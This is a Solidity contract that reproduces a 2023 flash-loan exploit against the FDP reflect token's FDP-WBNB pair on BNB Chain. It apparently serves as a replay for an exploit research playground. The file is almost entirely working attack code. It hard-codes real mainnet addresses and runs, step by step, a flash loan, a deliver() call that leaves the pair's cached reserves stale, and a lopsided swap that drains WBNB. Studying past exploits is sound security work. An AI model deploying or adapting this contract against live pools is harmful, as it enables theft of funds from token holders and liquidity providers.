// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-FDP).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (Exploit IS the Test; the DODO DPP flash-loan callback
// `DPPFlashLoanCall` lives on the test itself, `address(this)` is the
// attacker throughout) -- there is no standalone exploit contract to deploy.
// This is a faithful, self-contained copy of that inline attack (testHack ->
// run, DPPFlashLoanCall unchanged) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/FDP_exp.sol in the registry.
//
// Root cause: SAME bug class as 2023-01-BEVO / 2023-01-TINU. FDP is a
// reflect-style token whose `deliver()` redistributes the caller's own
// balance to all holders via a reflection mechanism, bypassing transfer()
// entirely. This leaves the FDP-WBNB pair's cached reserves stale relative
// to its real token balance, so a single lopsided `swap()` sized against the
// pair's real (post-deliver) WBNB balance -- rather than its stale cached
// reserve -- drains real WBNB out of the pair, netting ~16.18 WBNB profit
// from a single DODO DPP flash loan.

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface reflectiveERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function deliver(uint256 tAmount) external;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address sender, bytes calldata data) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

contract FDPDrain {
    IWETH private constant WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    reflectiveERC20 private constant FDP = reflectiveERC20(0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07);
    IUniswapV2Pair private constant FDP_WBNB = IUniswapV2Pair(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3);

    IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle private constant DPP = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);

    // step 0: flashloan 16.32 WBNB from the DODO DPP pool; DPPFlashLoanCall does the drain.
    function run() external {
        DPP.flashLoan(16.32 ether, 0, address(this), "0x1");
    }

    // Callback from the DODO DPP pool.
    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // step 1: swap the flash-loaned WBNB for FDP, taking a large position
        // in the reflect token and pushing fees into the FDP-WBNB pair.
        WBNB.approve(address(router), type(uint256).max);
        FDP.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(FDP);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            16.32 ether, 0, path, address(this), type(uint256).max
        );

        // step 2: deliver() redistributes our FDP balance to all holders via
        // the reflection mechanism (not transfer()), leaving the pair's
        // cached reserve stale relative to its true balance.
        FDP.deliver(28_463.16 ether);

        // step 3: a lopsided swap sized against the pair's real (now
        // inflated by deliver()) WBNB balance -- not its stale cached
        // reserve -- drains real WBNB out of the pair.
        FDP_WBNB.swap(0, WBNB.balanceOf(address(FDP_WBNB)) - 0.15 ether, address(this), "");

        // step 4: repay the flash loan; whatever WBNB remains is the profit.
        WBNB.transfer(address(DPP), baseAmount);
    }
}
